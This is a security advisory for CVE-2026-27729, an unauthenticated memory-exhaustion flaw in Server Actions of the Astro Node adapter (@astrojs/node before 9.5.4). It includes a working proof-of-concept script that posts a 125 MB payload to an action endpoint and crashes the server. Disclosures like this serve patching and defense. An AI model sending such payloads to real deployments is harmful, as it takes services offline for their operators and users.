# [M] Astro has memory exhaustion DoS due to missing request body size limit in Server Actions

## Summary
Severity: Medium
Advisory: GHSA-jm64-8m5q-4qh8
CVE: CVE-2026-27729
CWE: CWE-770
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-02-25
Source: https://github.com/advisories/GHSA-jm64-8m5q-4qh8
Type: github-advisory

## Affected
- npm: `@astrojs/node` — affected >=9.0.0 <9.5.4

## Details
## Summary

Astro server actions have no default request body size limit, which can lead to memory exhaustion DoS. A single large POST to a valid action endpoint can crash the server process on memory-constrained deployments.

## Details

On-demand rendered sites built with Astro can define server actions, which automatically parse incoming request bodies (JSON or FormData). The body is buffered entirely into memory with no size limit — a single oversized request is sufficient to exhaust the process heap and crash the server.

Astro's Node adapter (`mode: 'standalone'`) creates an HTTP server with no body size protection. In containerized environments, the crashed process is automatically restarted, and repeated requests cause a persistent crash-restart loop.

Action names are discoverable from HTML form attributes on any public page, so no authentication is required.

## PoC

<details>

### Setup

Create a new Astro project with the following files:

`package.json`:
```json
{
  "name": "poc-dos",
  "private": true,
  "scripts": {
    "build": "astro build",
    "start:128mb": "node --max-old-space-size=128 dist/server/entry.mjs"
  },
  "dependencies": {
    "astro": "5.17.2",
    "@astrojs/node": "9.5.3"
  }
}
```

`astro.config.mjs`:
```javascript
import { defineConfig } from 'astro/config';
import node from '@astrojs/node';

export default defineConfig({
  output: 'server',
  adapter: node({ mode: 'standalone' }),
});
```

`src/actions/index.ts`:
```typescript
import { defineAction } from 'astro:actions';
import { z } from 'astro:schema';

export const server = {
  echo: defineAction({
    input: z.object({ data: z.string() }),
    handler: async (input) => ({ received: input.data.length }),
  }),
};
```

`src/pages/index.astro`:
```astro
---
---
<html><body><p>Server running</p></body></html>
```

`crash-test.mjs`:
```javascript
const payload = JSON.stringify({ data: 'A'.repeat(125 * 1024 * 1024) });

console.log('Sending 125 MB payload...');
try {
  const res = await fetch('http://localhost:4321/_actions/echo', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
    body: payload,
  });
  console.log('Status:', res.status);
} catch (e) {
  console.log('Server crashed:', e.message);
}
```

### Reproduction

```bash
npm install && npm run build

# Terminal 1: Start server with 128 MB memory limit
npm run start:128mb

# Terminal 2: Send 125 MB payload
node crash-test.mjs
```

The server process crashes with `FATAL ERROR: Reached heap limit Allocation failed - JavaScript heap out of memory`. The payload is buffered entirely into memory before any validation, exceeding the 128 MB heap limit.

</details>

## Impact

Allows unauthenticated denial of service against SSR standalone deployments using server actions. A single oversized request crashes the server process, and repeated requests cause a persistent crash-restart loop in containerized environments.

## References
- https://github.com/withastro/astro/security/advisories/GHSA-jm64-8m5q-4qh8
- https://nvd.nist.gov/vuln/detail/CVE-2026-27729
- https://github.com/withastro/astro/pull/15564
- https://github.com/withastro/astro/commit/522f880b07a4ea7d69a19b5507fb53a5ed6c87f8
- https://github.com/withastro/astro
- https://github.com/withastro/astro/releases/tag/@astrojs/node@9.5.4
